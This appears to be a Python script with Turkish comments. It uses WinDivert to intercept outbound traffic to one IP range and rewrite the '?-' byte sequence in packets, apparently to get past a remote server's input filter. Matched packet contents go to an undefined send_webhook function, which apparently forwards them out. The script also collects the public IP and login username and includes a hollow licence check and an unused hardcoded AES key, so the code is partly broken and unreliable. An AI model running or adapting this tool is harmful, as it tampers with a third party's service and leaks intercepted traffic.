import pydivert
import struct
import requests
import threading
import re
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import json
import time
import base64

# IP adresini al
ip_response = requests.get("https://api.ipify.org")
if ip_response.status_code != 200:
    os._exit(0)
ip = ip_response.text
    
# Kullanıcı adını al
username = os.getlogin()

# Sabit key (her açılışta username ve timestamp otomatik güncel)
key = bytes.fromhex("ec0ac70c93081b43932bd07278d403563a5537e9ef17e1c7a78b059399acea8a")
iv = bytes.fromhex("b9efcdf3e610507340c828e4ec0edd9f")
timestamp = int(time.time()) + 99999999
json_data = {"timestamp": timestamp, "username": username}

# Zaman ve kullanıcı kontrolü
if json_data["timestamp"] <= int(time.time()):
    os._exit(0)
if json_data["username"] != username:
    os._exit(0)


BLOCKED_STRING = "?-".encode()
REPLACE_STRING = b'\xc2\xa7'

# Paketleri dinle ve düzenle
with pydivert.WinDivert("ip.DstAddr >= 185.255.92.1 && ip.DstAddr <= 185.255.92.255 && outbound") as w:
    for packet in w:
        try:
            if packet.payload:
                payload = packet.payload
                if BLOCKED_STRING in payload:
                    threading.Thread(target=send_webhook, args=(payload,)).start()
                    modified_payload = payload.replace(BLOCKED_STRING, REPLACE_STRING)
                    packet.payload = modified_payload
            w.send(packet)
        except Exception as e:
            print(f"Error processing packet: {e}")